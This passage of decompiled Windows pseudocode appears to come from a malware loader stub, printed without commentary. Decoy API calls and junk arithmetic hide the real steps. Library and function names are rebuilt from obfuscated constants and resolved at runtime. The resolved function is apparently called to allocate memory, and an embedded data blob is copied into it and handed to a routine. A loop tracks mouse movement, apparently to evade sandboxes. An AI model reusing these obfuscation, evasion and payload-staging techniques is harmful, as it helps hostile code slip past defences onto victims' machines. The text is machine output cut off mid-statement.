  char v201[255]; // [esp+1A71h] [ebp-D1Bh] BYREF
  int v202; // [esp+1B74h] [ebp-C18h]
  int v203; // [esp+1B78h] [ebp-C14h]
  int v204; // [esp+1B7Ch] [ebp-C10h]
  int v205; // [esp+1B80h] [ebp-C0Ch]
  struct tagPOINT v206; // [esp+1B84h] [ebp-C08h] BYREF
  int v207; // [esp+1B8Ch] [ebp-C00h]
  int X; // [esp+1D9Ch] [ebp-9F0h]
  int Y; // [esp+1DA0h] [ebp-9ECh]
  int Y_4; // [esp+1DA4h] [ebp-9E8h]
  int cy; // [esp+1DA8h] [ebp-9E4h]
  LONG WindowLongA; // [esp+1DACh] [ebp-9E0h]
  struct tagRECT rcDst; // [esp+1DB0h] [ebp-9DCh] BYREF
  char VersionInformation[156]; // [esp+1DC0h] [ebp-9CCh] BYREF
  int v215; // [esp+1E60h] [ebp-92Ch]
  int v216; // [esp+1E68h] [ebp-924h]
  int v217; // [esp+1E6Ch] [ebp-920h]
  size_t Size; // [esp+1E70h] [ebp-91Ch]
  int v219; // [esp+1E74h] [ebp-918h]
  __int64 v220; // [esp+1E78h] [ebp-914h]
  FARPROC ProcAddress; // [esp+1E84h] [ebp-908h]
  unsigned __int64 v222; // [esp+1E88h] [ebp-904h]
  __int64 v223; // [esp+1E90h] [ebp-8FCh]
  __int64 v224; // [esp+1E98h] [ebp-8F4h]
  __int64 v225; // [esp+1EA0h] [ebp-8ECh]
  LPCSTR lpLibFileName; // [esp+1EACh] [ebp-8E0h]
  void *Factory; // [esp+1EB4h] [ebp-8D8h]
  LPCSTR lpProcName; // [esp+1EB8h] [ebp-8D4h]
  int v229[4]; // [esp+1EBCh] [ebp-8D0h] BYREF
  char v230[4]; // [esp+1ECCh] [ebp-8C0h] BYREF
  unsigned __int64 v231; // [esp+1ED0h] [ebp-8BCh]
  int v232; // [esp+1EDCh] [ebp-8B0h] BYREF
  _DWORD v233[4]; // [esp+1EE0h] [ebp-8ACh] BYREF
  __int64 v234; // [esp+1EF0h] [ebp-89Ch]
  void *ppIFactory[2]; // [esp+1EF8h] [ebp-894h] BYREF
  unsigned __int64 v236; // [esp+1F00h] [ebp-88Ch]
  float v237; // [esp+1F0Ch] [ebp-880h]
  __int64 v238; // [esp+1F10h] [ebp-87Ch]
  int v239; // [esp+1F18h] [ebp-874h]
  int v240; // [esp+1F1Ch] [ebp-870h]
  unsigned __int64 v241; // [esp+1F20h] [ebp-86Ch]
  int v242; // [esp+1F2Ch] [ebp-860h]
  struct tagRECT Rect; // [esp+1F30h] [ebp-85Ch] BYREF
  HMODULE hModule; // [esp+1F40h] [ebp-84Ch]
  LONG dwNewLong; // [esp+1F44h] [ebp-848h]
  HWND ForegroundWindow; // [esp+1F48h] [ebp-844h]
  int MinPos; // [esp+1F4Ch] [ebp-840h] BYREF
  int nBar; // [esp+1F50h] [ebp-83Ch]
  HWND hWnd; // [esp+1F54h] [ebp-838h]
  int MaxPos[4]; // [esp+1F58h] [ebp-834h] BYREF
  HGLRC Context; // [esp+1F68h] [ebp-824h]
  HDC DC; // [esp+1F6Ch] [ebp-820h]
  HMENU uIDNewItem; // [esp+1F70h] [ebp-81Ch]
  LPCSTR uIDNewItem_4; // [esp+1F74h] [ebp-818h]
  HMENU hMenu; // [esp+1F78h] [ebp-814h]
  int v256[4]; // [esp+1F7Ch] [ebp-810h] BYREF
  unsigned int v257; // [esp+1F8Ch] [ebp-800h]
  int v258; // [esp+1F90h] [ebp-7FCh]
  unsigned int v259; // [esp+1F94h] [ebp-7F8h]
  int v260; // [esp+1F98h] [ebp-7F4h]
  int v261; // [esp+1F9Ch] [ebp-7F0h]
  int v262; // [esp+1FA0h] [ebp-7ECh]
  int v263; // [esp+1FA4h] [ebp-7E8h]
  int v264; // [esp+1FA8h] [ebp-7E4h]
  HINSTANCE v265; // [esp+1FACh] [ebp-7E0h]
  unsigned int v266; // [esp+1FB0h] [ebp-7DCh]
  unsigned int v267; // [esp+1FB4h] [ebp-7D8h]
  unsigned int v268; // [esp+1FBCh] [ebp-7D0h]
  int v269; // [esp+1FC0h] [ebp-7CCh]
  int v270; // [esp+1FC4h] [ebp-7C8h]
  int v271; // [esp+1FC8h] [ebp-7C4h]
  int v272; // [esp+1FCCh] [ebp-7C0h]
  int v273; // [esp+20D4h] [ebp-6B8h]
  int v274; // [esp+20D8h] [ebp-6B4h]
  unsigned int v275; // [esp+20DCh] [ebp-6B0h]
  unsigned int v276; // [esp+20E0h] [ebp-6ACh]
  int v277; // [esp+20E4h] [ebp-6A8h]
  __int16 v278; // [esp+20E8h] [ebp-6A4h]
  char v279[518]; // [esp+20EAh] [ebp-6A2h] BYREF
  BOOL v280; // [esp+22F0h] [ebp-49Ch]
  struct tagCHOOSECOLORA v281; // [esp+22F4h] [ebp-498h] BYREF
  char v282; // [esp+2318h] [ebp-474h] BYREF
  POINT pt; // [esp+235Ch] [ebp-430h]
  RECT rc; // [esp+2364h] [ebp-428h] BYREF
  int i; // [esp+2374h] [ebp-418h]
  struct tagOFNW v286; // [esp+2378h] [ebp-414h] BYREF
  int left; // [esp+23D0h] [ebp-3BCh]
  int top; // [esp+23D4h] [ebp-3B8h]
  __int64 right; // [esp+23D8h] [ebp-3B4h]
  HDC hdc; // [esp+23E0h] [ebp-3ACh]
  int v291; // [esp+23E4h] [ebp-3A8h]
  int v292; // [esp+23E8h] [ebp-3A4h]
  int v293; // [esp+23ECh] [ebp-3A0h]
  int v294; // [esp+23F0h] [ebp-39Ch]
  int v295; // [esp+23F4h] [ebp-398h]
  int v296; // [esp+23F8h] [ebp-394h]
  int v297; // [esp+23FCh] [ebp-390h]
  int v298; // [esp+2400h] [ebp-38Ch]
  int v299; // [esp+2404h] [ebp-388h]
  HINSTANCE v300; // [esp+2408h] [ebp-384h]
  int v301; // [esp+240Ch] [ebp-380h]
  int v302; // [esp+2410h] [ebp-37Ch]
  int *v303; // [esp+2414h] [ebp-378h]
  unsigned int v304; // [esp+2418h] [ebp-374h]
  int v305; // [esp+241Ch] [ebp-370h] BYREF
  int v306; // [esp+2420h] [ebp-36Ch]
  bool v307[4]; // [esp+2424h] [ebp-368h] BYREF
  HWND v308; // [esp+2428h] [ebp-364h]
  int v309; // [esp+242Ch] [ebp-360h]
  int v310; // [esp+2430h] [ebp-35Ch]
  int v311; // [esp+2434h] [ebp-358h]
  int v312; // [esp+2438h] [ebp-354h]
  void *v313[6]; // [esp+243Ch] [ebp-350h] BYREF
  int v314; // [esp+2454h] [ebp-338h]
  char v315; // [esp+2458h] [ebp-334h]
  char v316[255]; // [esp+2459h] [ebp-333h] BYREF
  int v317; // [esp+255Ch] [ebp-230h]
  int v318; // [esp+2560h] [ebp-22Ch]
  int v319; // [esp+2564h] [ebp-228h]
  int v320; // [esp+2568h] [ebp-224h]
  int v321; // [esp+256Ch] [ebp-220h]
  __int16 v322[260]; // [esp+2570h] [ebp-21Ch] BYREF
  int v323; // [esp+2778h] [ebp-14h]
  unsigned int v324; // [esp+277Ch] [ebp-10h]
  int v325; // [esp+2788h] [ebp-4h]
  int savedregs; // [esp+278Ch] [ebp+0h] BYREF

  v1 = alloca(10000);
  v324 = 0;
  v308 = 0;
  v291 = 1;
  v304 = 0;
  v300 = hInstance;
  v292 = 0;
  v301 = 1;
  v314 = 0;
  v297 = 2;
  v298 = 2;
  v306 = 2;
  v321 = 0;
  v302 = 10;
  v315 = 0;
  memset(v316, 0, sizeof(v316));
  v309 = 0;
  v310 = 0;
  v311 = 0;
  v312 = 0;
  v293 = 0;
  v294 = 0;
  v295 = 0;
  v296 = 0;
  v317 = 0;
  v318 = 0;
  v319 = 0;
  v320 = 0;
  memset(v322, 0, sizeof(v322));
  left = 0;
  top = 0;
  right = 0i64;
  hdc = 0;
  ExcludeClipRect(0, 0, 0, 0, 0);
  v323 = 43;
  sub_40885B(v307);
  v325 = 0;
  while ( v323-- )
  {
    GetWindowLongA(::hWnd, -21);
    if ( v322 )
      dword_452318 -= dword_452314 + v293 / 42 - dword_452308;
  }
  c = ::nIDDlgItem + dword_45230C - v291;
  memset(&v286, 0, sizeof(v286));
  if ( ::hdc && GetSaveFileNameW(&v286) )
    ::nIDDlgItem = 0;
  SetCapture(::hWnd);
  for ( i = 0; i < (int)dword_452310 * ((int)::hdc + 9); ++i )
  {
    v300 = (HINSTANCE)((unsigned __int16)v300 - dword_452300 - (_DWORD)::hDlg);
    c = ::nIDDlgItem + dword_45230C - v291;
    if ( dword_4521AC )
    {
      ::y = v304 / 0x27 - (unsigned __int16)FileName - dword_4521AC;
    }
    else
    {
      v34 = (float)(int)cpt;
      v17 = log10(v34);
      v33 = v17;
      v300 = (HINSTANCE)(unsigned __int64)(v17 - (double)(unsigned __int16)dword_452310 + (double)::y);
    }
    v298 = (unsigned __int8)sub_408876(v307, v292);
    memset(&rc, 0, sizeof(rc));
    pt = 0i64;
    if ( PtInRect(&rc, 0i64) )
      ::y += c;
    c += (int)cpt + dword_452300 + dword_452314 / 14;
    v306 = sub_4087BE(0);
    v301 += v301 + dword_452300 - (_DWORD)::hWnd;
    v291 += (int)cpt / 28 + (unsigned __int16)dword_45230C - (_DWORD)v300;
    v297 = sub_408708(v307, v308);
    v304 = v292 * (_DWORD)dword_452310 * (_DWORD)::hdc;
    if ( c - dword_45232C > ::y )
      c = (int)::hDlg / 32 + c * dword_45232C / (dword_452300 + 58) - (_DWORD)cpt;
    else
      ::y -= ::nIDDlgItem;
    if ( ::hDlg == (HWND)v297 && (HDC)v298 == cpt && (HWND)v306 == ::hWnd )
    {
      v300 = (HINSTANCE)((char *)::hWnd + v292);
      v314 = dword_452308;
    }
    else
    {
      ::nIDDlgItem = dword_452318 + (unsigned __int16)c - dword_45232C;
      v314 = 0;
    }
    v300 = (HINSTANCE)(::y - dword_45230C - (unsigned __int8)v292 - v304);
    if ( v314 )
    {
      if ( v310 + (unsigned __int16)v320 )
        dword_452318 -= v304;
      else
        v291 -= dword_452314 + (unsigned __int8)cpt;
      if ( (_WORD)c )
        v319 -= (unsigned __int8)cpt + (unsigned __int16)((unsigned __int16)&savedregs - 540);
      v314 = 0;
    }
    else
    {
      memset(&v281, 0, sizeof(v281));
      v281.lStructSize = 36;
      v281.lpCustColors = (COLORREF *)&v282;
      v281.hwndOwner = (HWND)((char *)::hDlg + (_DWORD)dword_452310);
      v281.hInstance = (HWND)((char *)::hDlg + (_DWORD)dword_452310);
      v280 = ChooseColorA(&v281);
    }
  }
  v299 = 4;
  while ( v299-- )
  {
    ::nIDDlgItem += ::y + v294 * (unsigned __int16)dword_452310;
    RedrawWindow(::hDlg, 0, 0, 0x101u);
  }
  sub_408A89(v313);
  LOBYTE(v325) = 1;
  v55 = (__int16)dword_452310;
  sub_408C22(v313, &v55);
  v54 = ::nIDDlgItem;
  sub_408C22(v313, &v54);
  v53 = v292;
  sub_408C22(v313, &v53);
  dword_45232C = (_DWORD)cpt * c * (_DWORD)dword_452310 * dword_452314 + 2;
  v30 = (int **)sub_4091A1(v313, v31);
  LOBYTE(v325) = 2;
  v32 = (unsigned __int16 *)sub_409D68(v30);
  LOBYTE(v325) = 1;
  v305 = *v32;
  v303 = &v305;
  sub_408B83(v313);
  LOBYTE(v325) = 3;
  sub_408CFA((int)v313);
  LOBYTE(v325) = 0;
  sub_409148(v313);
  v325 = -1;
  sub_408852();
  v268 = 0;
  v257 = 1;
  v267 = v324;
  v265 = hInstance;
  v259 = 0;
  v266 = 1;
  v277 = 1;
  v264 = 0;
  v269 = 0;
  v270 = 0;
  v271 = 0;
  v272 = 0;
  v260 = 0;
  v261 = 0;
  v262 = 0;
  v263 = 0;
  v273 = 0;
  v274 = 0;
  v275 = 0;
  v276 = 0;
  v278 = 0;
  memset(v279, 0, sizeof(v279));
  uIDNewItem_4 = 0;
  hMenu = CreateMenu();
  uIDNewItem = LoadMenuA(hInstance, "Menu");
  LoadBitmapA(hInstance, "Bitmap");
  AppendMenuA(hMenu, 0x14u, (UINT_PTR)uIDNewItem, uIDNewItem_4);
  uIDNewItem = LoadMenuA(hInstance, "Edit");
  v258 = (int)::hWnd + 77;
  do
  {
    if ( (_BYTE)dword_45206C )
      v259 *= (unsigned __int16)dword_45206C;
    else
      v257 -= (unsigned int)::hWnd;
    DC = GetDC(::hDlg);
    Context = wglCreateContext(DC);
    ::hDlg = (HWND)wglMakeCurrent(DC, Context);
    SetBrushOrgEx(::hdc, 1, 0, 0);
    --v258;
  }
  while ( v258 );
  if ( v261 < dword_4521AC )
    v272 += dword_452300 + ::y;
  else
    dword_45230C = v270;
  v29 = (float)dword_452318;
  v16 = cos(v29);
  v28 = v16;
  v15 = cos((double)v267);
  v27 = v15;
  ::Y = (int)((double)v266 + v16 + (double)dword_4521AC - v15);
  c += v261 / 8 + (unsigned __int8)v272 * (unsigned __int8)dword_452314;
  MaxPos[1] = (int)::hdc;
  MaxPos[3] = 0;
  MaxPos[2] = ::nIDDlgItem;
  ::hWnd = (HWND)AttachThreadInput(0, ::nIDDlgItem, 1);
  hWnd = ::hDlg;
  nBar = 22;
  MinPos = 18;
  MaxPos[0] = 25;
  GetScrollPos(::hDlg, 22);
  GetScrollRange(hWnd, nBar, &MinPos, MaxPos);
  c = dword_452318
    + v268 / 6
    + (unsigned __int8)::hDlg
    + (unsigned __int8)::Y
    + (int)::hWnd / (int)(::hDlg + 18)
    - (unsigned __int16)v259;
  WinHttpOpen(&pszAgentW, 0, 0, 0, 0);
  ForegroundWindow = GetForegroundWindow();
  dwNewLong = GetWindowLongA(ForegroundWindow, -4);
  SetActiveWindow(ForegroundWindow);
  SetWindowLongA(ForegroundWindow, -4, dwNewLong);
  v26 = &v25;
  memset(v256, 0, 12);
  v325 = 4;
  v52 = (char)cpt;
  sub_408982((int)v256, &v52);
  if ( (int)::hDlg <= dword_45232C )
    v265 = (HINSTANCE)(v269 + dword_45232C * (unsigned __int16)v272 + c / 23 - dword_452308 * v270);
  else
    v272 -= (int)::hdc + v259;
  v51 = v257;
  sub_408982((int)v256, &v51);
  v50 = v266;
  sub_408982((int)v256, &v50);
  if ( ::y )
  {
    *(float *)&v14 = exp((double)v257);
    v24[17] = v14;
    v13 = (double)::y;
    v4 = asin((double)c);
    dword_45230C = (unsigned __int64)(v13
                                    - v4 * *(float *)&v14 / 10.0
                                    + (double)(unsigned __int8)v267
                                    - (double)(unsigned __int16)dword_452300
                                    + (double)(unsigned int)dword_45230C);
  }
  else
  {
    v265 = (HINSTANCE)((char *)v265 - (unsigned __int16)c - v257 / (dword_452300 + 57));
  }
  ::y = (int)::hDlg + ::y - v259 * dword_452314 - (unsigned __int8)dword_452308 - (_DWORD)dword_452310;
  v259 = v266 / 0x1C + (unsigned __int16)c - (unsigned __int8)dword_45230C - (unsigned __int8)::Y - dword_452318 * v257;
  sub_408A46(v256);
  v275 = v257 + v266 + v275 * v268;
  if ( v268 == v262 )
    v276 = v275 - v266;
  else
    dword_452318 += v273 + ::Y + dword_452308 * (unsigned __int16)::hDlg - (_DWORD)::hWnd;
  v325 = 5;
  sub_408E24((int)v256);
  v325 = -1;
  Factory = (void *)sub_409E44(D2D1_FACTORY_TYPE_SINGLE_THREADED, ppIFactory);
  ppIFactory[1] = Factory;
  v220 = (__int64)Factory + 0x2FB3CCA5CD6AC107i64;
  v224 = 0x4E835A81F5311B3Ei64 - (int)Factory;
  v233[0] = *(_DWORD *)L"Verdana";
  v233[1] = *(_DWORD *)L"rdana";
  v233[2] = *(_DWORD *)L"ana";
  v233[3] = *(_DWORD *)L"a";
  v222 = 0xE18228E1C6E4E8B9ui64 * ((int)Factory + 1);
  v236 = 0xF0BB1DF1CCE4ECA4ui64 / (1 - (int)Factory);
  v238 = 51i64;
  v237 = 50.0;
  v223 = 32710718i64;
  v225 = 18i64;
  v234 = (int)Factory + 13;
  v239 = 208896;
  v240 = 0;
  if ( (int)Factory >= 0 )
  {
    Factory = (void *)DWriteCreateFactory(0, &unk_423AE4, v229);
    v241 = v222 + v220 * v224;
    v231 = v236 + v220 * v224;
    v242 = v225 + v238 * v223;
  }
  if ( (int)Factory >= 0 )
  {
    lpLibFileName = (LPCSTR)GlobalAlloc(0x40u, 0x20u);
    Factory = (void *)(*(int (__stdcall **)(int, _DWORD *, _DWORD, int, _DWORD, int, float, __int16 *, int *))(*(_DWORD *)v229[0] + 60))(
                        v229[0],
                        v233,
                        0,
                        400,
                        0,
                        5,
                        COERCE_FLOAT(LODWORD(v237)),
                        &word_423A88,
                        &v232);
    *(_QWORD *)lpLibFileName = v241;
  }
  if ( (int)Factory >= 0 )
  {
    hModule = LoadLibraryA(lpLibFileName);
    Factory = (void *)(*(int (__stdcall **)(int, int))(*(_DWORD *)v232 + 12))(v232, 2);
    lpProcName = (LPCSTR)GlobalAlloc(0x40u, 0x20u);
  }
  if ( (int)Factory >= 0 )
  {
    *(_QWORD *)lpProcName = v231;
    v5 = lpProcName;
    *((_DWORD *)lpProcName + 2) = v242;
    *((_DWORD *)v5 + 3) = 0;
    Factory = (void *)(*(int (__stdcall **)(int, int))(*(_DWORD *)v232 + 16))(v232, 2);
  }
  if ( (int)Factory < 0 )
    return -1;
  GetClientRect(::hWnd, &Rect);
  v24[13] = Rect.right;
  v24[14] = Rect.bottom;
  v24[15] = Rect.right;
  v24[16] = Rect.bottom;
  v49[4] = Rect.right;
  v49[5] = Rect.bottom;
  v229[2] = Rect.right;
  v229[3] = Rect.bottom;
  v24[9] = (int)::hWnd;
  v24[10] = Rect.right;
  v24[11] = Rect.bottom;
  v24[12] = 0;
  v45 = ::hWnd;
  v46 = Rect.right;
  bottom = Rect.bottom;
  v48 = 0;
  v49[0] = ::hWnd;
  v49[1] = Rect.right;
  v49[2] = Rect.bottom;
  v49[3] = 0;
  v42 = 0;
  v43 = 0;
  memset(v24, 0, 12);
  *(float *)&v24[3] = 0.0;
  *(float *)&v24[4] = 0.0;
  memset(&v24[5], 0, 16);
  qmemcpy(v41, v24, sizeof(v41));
  qmemcpy(v44, v41, sizeof(v44));
  v23 = ppIFactory[0];
  Factory = (void *)(*(int (__stdcall **)(void *, char *, _DWORD *, char *))(*(_DWORD *)ppIFactory[0] + 56))(
                      ppIFactory[0],
                      v44,
                      v49,
                      v230);
  ProcAddress = GetProcAddress(hModule, lpProcName);
  if ( (int)Factory < 0 )
  {
    dword_4521AC = ((int (__thiscall *)(_DWORD, _DWORD, int, int, _DWORD))ProcAddress)(
                     (unsigned __int64)(v238 + v234) >> 32,
                     0,
                     v239,
                     12288,
                     v238 + v234);
    v219 = 0;
  }
  memset(VersionInformation, 0, sizeof(VersionInformation));
  *(_DWORD *)VersionInformation = 156;
  GetVersionExA((LPOSVERSIONINFOA)VersionInformation);
  v217 = 0;
  if ( (unsigned int)dword_452310 >= *(_DWORD *)&VersionInformation[8] + *(_DWORD *)&VersionInformation[4] )
  {
    if ( (unsigned int)::hDlg <= *(_DWORD *)&VersionInformation[4] )
      dword_452068 = (char *)::hdc + dword_4521AC;
    else
      dword_452068 = (void *)::nIDDlgItem;
  }
  else
  {
    dword_452068 = (void *)dword_452308;
  }
  CopyRect(&rcDst, &rcDst);
  WindowLongA = GetWindowLongA(::hDlg, -16);
  v215 = 2 * (_DWORD)::hdc + 3;
  Size = dword_45232C + v215 * ((_DWORD)::hWnd + (_BYTE *)dword_452310 - (_BYTE *)::hDlg);
  if ( *(_DWORD *)&VersionInformation[4] <= (unsigned int)::hdc )
    memcpy(dword_452068, FileName, c + ::y + ::nIDDlgItem);
  else
    memcpy(dword_452068, (char *)dword_402B10 + (_DWORD)::hdc + (_DWORD)::hDlg + (unsigned int)::hWnd, Size);
  v216 = 168;
  if ( ::hdc == (HDC)((char *)::hDlg + (_DWORD)::hWnd) )
    sub_404176((int)dword_452068, Size, v216 + dword_45232C);
  X = GetDlgItemInt(::hDlg, ::y, 0, 1);
  SetWindowPos(::hWnd, 0, X, Y, Y_4, cy, 0x14u);
  if ( !::hDlg )
    *(_DWORD *)((char *)dword_452068 + 1) = &hInstance;
  v195 = 0;
  v180 = 1;
  v192 = v324;
  v189 = hInstance;
  v181 = 0;
  v190 = 1;
  v207 = 1;
  v191 = 0;
  v200 = 0;
  memset(v201, 0, sizeof(v201));
  v196 = 0;
  v197 = 0;
  v198 = 0;
  v199 = 0;
  v182 = 0;
  v183 = 0;
  v184 = 0;
  v185 = 0;
  v202 = 0;
  v203 = 0;
  v204 = 0;
  v205 = 0;
  ::nIDDlgItem = (unsigned __int8)::y;
  v188 = 0;
  v194 = 0;
  Point.x = 0;
  Point.y = 0;
  v206.x = 0;
  v206.y = 0;
  sub_408A89(v187);
  v325 = 6;
  v40 = dword_45206C;
  sub_408AAB(v187, &v40);
  GetCursorPos(&Point);
  hHandle = CreateEventA(0, 0, 0, 0);
  for ( j = 0; j < v190 + v180 + 8; ++j )
  {
    v7 = sin((double)(int)cpt);
    v181 = (unsigned __int64)(v7 / (double)(int)(::hdc + 19) * (double)v184
                            - (double)(dword_452308 / 16)
                            + (double)(unsigned int)dword_45230C);
    GetCursorPos(&v206);
    v39 = dword_452300;
    sub_408C22(v187, &v39);
    v20 = (int **)sub_4091A1(v187, v21);
    LOBYTE(v325) = 7;
    v22 = (unsigned __int16 *)sub_409D68(v20);
    LOBYTE(v325) = 6;
    v178 = *v22;
    v177 = &v178;
    v38 = (__int16)dword_452310;
    sub_408C22(v187, &v38);
    sub_408B83(v187);
    if ( Point.x != v206.x || Point.y != v206.y )
    {
      v12 = (double)((unsigned __int16)dword_45206C - dword_452300 / 34);
      v8 = sin((double)dword_45232C);
      ::nIDDlgItem = (int)(v12 - v8 * (double)(unsigned int)dword_4518F4 * (double)v195 - (double)v184);
      Point = v206;
      ++v188;
    }
    if ( dword_45232C * (unsigned __int8)((unsigned __int8)&savedregs + 4) > ::nIDDlgItem )
      v181 += dword_45232C;
    else
      v192 -= (unsigned __int16)((unsigned __int16)&savedregs - 3068);
    if ( v188 == v180 )
    {
      v11 = ceil((double)v181);
      v19 = (float)c;
      v10 = cos(v19);
      v184 = (int)((double)v184
                 - ((double)(v180 + (unsigned __int8)::hdc - ::Y)
                  - v11
                  + (double)(unsigned __int16)::nIDDlgItem * v10
                  - (double)dword_4521AC));
      ++v194;
    }
    if ( ::y * c )
    {
      v18 = (float)(int)::hdc;
      v9 = cos(v18);
      v181 = (unsigned __int64)((double)v181 - (v9 - (double)v192 - (double)dword_452300));
    }
    if ( v188 > v180 )
      break;
    memset(&v176, 0, sizeof(v176));
    GetClientRect(::hDlg, &v176);
    ClientToScreen(::hWnd, (LPPOINT)&v176);
    if ( v194 >= v190 + 4 )
    {
      pwcsName = 0;
      StgOpenStorage(&pwcsName, 0, 0x10002u, 0, 0, &ppstgOpen);
      break;
    }
    WaitForSingleObject(hHandle, (DWORD)(::hdc + 750));
  }
  for ( k = 0; k < (int)::hdc + 57; ++k )
  {
    v170[1] = (IStorage *)::hDlg;
    SendMessageA(::hDlg, 0x143u, 0, (LPARAM)lParam);
    sub_408A89(v172);
    LOBYTE(v325) = 8;
    v37 = dword_452308;
    sub_408E70(v172, &v37);
    if ( v172[4] )
      ::y = c + dword_45206C;
    else
      v180 -= ::Y * (v202 / (dword_452300 + 78)) + (unsigned __int8)dword_452300;
    v172[6] = (void *)sub_408F48(v172);
    v36 = dword_45206C;
    sub_408E70(v172, &v36);
    sub_408FBC(v172, &dword_452314);
    v35 = ::hDlg;
    sub_408E70(v172, &v35);
    if ( !dword_452318 )
      v192 -= c;
    LOBYTE(v325) = 9;
    sub_409094((int)v172);
    LOBYTE(v325) = 6;
    sub_409148(v172);
  }
  v170[0] = 0;
  if ( cpt && ::hDlg )
    StgCreateDocfile(0, 0x10002u, 0, v170);
  v325 = 10;
  sub_408CFA((int)v187);
  v325 = -1;
  sub_409148(v187);
  if ( ::hdc )
  {
    v169 = ::hDlg;
    v162 = ::Y;
    v168 = 0;
    v163 = 60;
    v166 = 0;
    v165 = ::hdc;
    v164 = dword_452328 + 1;
    v167 = ::y + ::nIDDlgItem;
    v161 = c - ::Y;
    hbm = (HBITMAP)LoadImageA(0, FileName, 0, 0, 0, 0x2010u);
    hdcDest = CreateDCA("DISPLAY", 0, 0, 0);
    memset(v153, 0, sizeof(v153));
    lpbmi = (LPBITMAPINFO)v153;
    *(_DWORD *)v153 = 1064;
    GetDIBits(hdcDest, hbm, 0, 0, 0, (LPBITMAPINFO)v153, 0);
    hdcSrc = CreateCompatibleDC(hdcDest);
    h = CreateCompatibleBitmap(hdcDest, lpbmi->bmiHeader.biWidth, lpbmi->bmiHeader.biHeight);
    v159 = SelectObject(hdcSrc, h);
    DrawStateA(hdcSrc, 0, 0, (LPARAM)hbm, 0, 0, 0, lpbmi->bmiHeader.biWidth, lpbmi->bmiHeader.biHeight, 4u);
    ftn.BlendOp = 0;
    ftn.BlendFlags = 0;
    ftn.SourceConstantAlpha = 0x80;
    ftn.AlphaFormat = 1;
    AlphaBlend(
      hdcDest,
      100,
      100,
      lpbmi->bmiHeader.biWidth,
      lpbmi->bmiHeader.biHeight,
      hdcSrc,
      0,
      0,
      lpbmi->bmiHeader.biWidth,
      lpbmi->bmiHeader.biHeight,
      ftn);
    SelectObject(hdcSrc, v159);
    DeleteObject(h);
    DeleteDC(hdcSrc);
    DeleteDC(hdcDest);
    DeleteObject(hbm);
    DlgItem = GetDlgItem(::hDlg, ::nIDDlgItem);
    v152 = (int *)&v149;
    v151 = ::nIDDlgItem;
    cWidth = 4;
    if ( ::nIDDlgItem )
      hDC = GetDC(0);
    else
      hDC = GetDC(DlgItem);
    if ( !::hDlg )
      hDC = (HDC)(dword_452328 + 1);
    Pen = CreatePen(0, cWidth, 0);
    v147 = SelectObject(hDC, Pen);
    hDC_4 = SetROP2(hDC, 6);
    if ( ::hdc )
    {
      v152[1] = v152[1] + cWidth - 2;
      v152[3] = v152[3] - cWidth + 2;
      *v152 = *v152 + cWidth - 2;
      v152[2] = v152[2] - cWidth + 2;
      MoveToEx(hDC, *v152, v152[1], 0);
      LineTo(hDC, v152[2] - cWidth, v152[1]);
      MoveToEx(hDC, v152[2], v152[1], 0);
      LineTo(hDC, v152[2], v152[3] - cWidth);
      MoveToEx(hDC, v152[2], v152[3], 0);
      LineTo(hDC, cWidth + *v152, v152[3]);
      MoveToEx(hDC, *v152, v152[3], 0);
      LineTo(hDC, *v152, cWidth + v152[1]);
    }
    else
    {
      Rectangle(hDC, *v152, v152[1], v152[2], v152[3]);
    }
    SelectObject(hDC, v147);
    SetROP2(hDC, hDC_4);
    ReleaseDC(DlgItem, hDC);
    if ( ::hdc )
    {
      v134 = (HDC)(dword_452328 + 1);
      v135 = (HDC)(dword_452328 + 2);
      pbmi.bmiHeader.biSize = 40;
      pbmi.bmiHeader.biWidth = wDest;
      pbmi.bmiHeader.biHeight = hDest;
      pbmi.bmiHeader.biPlanes = 1;
      pbmi.bmiHeader.biBitCount = 32;
      memset(&pbmi.bmiHeader.biCompression, 0, 24);
      ho = CreateDIBSection((HDC)(dword_452328 + 2), &pbmi, 0, &ppvBits, 0, 0);
      v127 = CreateDIBSection(v134, &pbmi, 0, &v126, 0, 0);
      CompatibleDC = CreateCompatibleDC(0);
      v130 = SelectObject(CompatibleDC, ho);
      if ( !StretchBlt(CompatibleDC, 0, 0, wDest, hDest, v135, xSrc, ySrc, wSrc, hSrc, 0xCC0020u) )
        ::nIDDlgItem = 0;
      SelectObject(CompatibleDC, v127);
      if ( !StretchBlt(CompatibleDC, 0, 0, wDest, hDest, v134, x, y, wDest, hDest, 0xCC0020u) )
        ::y = 0;
      SelectObject(CompatibleDC, v130);
      DeleteDC(CompatibleDC);
      pbmi.bmiColors[0] = 0;
      while ( *(_DWORD *)pbmi.bmiColors < hDest )
      {
        v121 = (unsigned __int8 *)v126 + 4 * wDest * *(_DWORD *)pbmi.bmiColors;
        v124 = (unsigned __int8 *)ppvBits + 4 * wDest * *(_DWORD *)pbmi.bmiColors;
        for ( m = 0; m < wDest; ++m )
        {
          v123 = v124[3];
          if ( v123 )
          {
            v123 = v142 * (100 * v123 / 255) / 100;
            v122 = -1 - v123;
            *v124 = (unsigned __int16)(v123 * *v124 + (unsigned __int8)(-1 - v123) * *v121) >> 8;
            v124[1] = (unsigned __int16)(v123 * v124[1] + v122 * v121[1]) >> 8;
            v124[2] = (unsigned __int16)(v123 * v124[2] + v122 * v121[2]) >> 8;
          }
          else
          {
            *v124 = *v121;
            v124[1] = v121[1];
            v124[2] = v121[2];
          }
          v124 += 4;
          v121 += 4;
        }
        ++*(_DWORD *)pbmi.bmiColors;
      }
      CompatibleDC = CreateCompatibleDC(0);
      v130 = SelectObject(CompatibleDC, ho);
      if ( !BitBlt(v134, x, y, wDest, hDest, CompatibleDC, 0, 0, 0xCC0020u) )
        ::nIDDlgItem = 0;
      DeleteDC(CompatibleDC);
      DeleteObject(ho);
      DeleteObject(v127);
    }
  }
  v120 = ::hDlg;
  v112 = ::Y;
  v119 = 0;
  v113 = 60;
  v117 = 0;
  v116 = ::hdc;
  v114 = dword_452328 + 1;
  v118 = ::y + ::nIDDlgItem;
  v111 = c - ::Y;
  hWndParent = ::hDlg;
  Msg = (UINT)::hdc;
  wParam = ::nIDDlgItem;
  v110 = ::y;
  v104 = hInstance;
  if ( ::hdc == (HDC)1 )
  {
    dword_452340 = CreateWindowExA(0, "edit", 0, 0x50800000u, c, ::Y, ::nIDDlgItem, ::y, hWndParent, 0, v104, 0);
    dword_45233C = (int)CreateWindowExA(
                          0,
                          "button",
                          "Load",
                          0x50000000u,
                          c,
                          ::Y,
                          ::nIDDlgItem,
                          ::y,
                          hWndParent,
                          0,
                          v104,
                          0);
    return 0;
  }
  if ( ::hdc == (HDC)2 )
  {
    PostQuitMessage(0);
    return 0;
  }
  if ( ::hdc == (HDC)15 )
